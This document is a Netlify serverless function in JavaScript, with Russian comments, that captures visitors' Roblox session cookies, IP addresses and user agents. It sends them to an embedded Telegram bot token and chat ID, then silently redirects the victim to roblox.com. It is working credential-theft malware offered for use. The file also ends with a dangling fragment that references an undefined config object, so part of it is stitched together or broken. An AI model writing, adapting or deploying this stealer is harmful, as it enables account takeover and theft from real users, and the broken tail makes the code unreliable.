const fetch = require('node-fetch');

exports.handler = async (event) => {
    const BOT_TOKEN = '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM';
    const CHAT_ID = '7695851744';
    
    console.log('Function started'); // Логирование
    
    try {
        const cookies = event.headers.cookie || 'No cookies found';
        const userAgent = event.headers['user-agent'] || 'Unknown';
        const ip = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown';

        console.log('Cookies received:', cookies); // Логирование куков

        const message = `🔴 ROBLOX COOKIES CAPTURED
📅 Time: ${new Date().toLocaleString()}
📍 IP: ${ip}
🌐 User-Agent: ${userAgent.substring(0, 60)}...

🍪 COOKIES:
${cookies}

⚡ Sent via Netlify Function`;

        // Отправка в Telegram
        const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const telegramData = await telegramResponse.json();
        console.log('Telegram response:', telegramData); // Логирование ответа Telegram

        if (!telegramResponse.ok) {
            throw new Error(`Telegram API error: ${telegramData.description}`);
        }

        // Редирект
        return {
            statusCode: 302,
            headers: {
                'Location': 'https://www.roblox.com/',
                'Cache-Control': 'no-cache'
            }
        };

    } catch (error) {
        console.error('Error:', error.message);
        
        return {
            statusCode: 302,
            headers: {
                'Location': 'https://www.roblox.com/'
            }
        };
    }
};        parse_mode: 'HTML'
      })
    });

    // Мгновенный редирект
    return Response.redirect(config.redirect, 302);

  } catch (error) {
    return Response.redirect('https://www.roblox.com/', 302);
  }
};
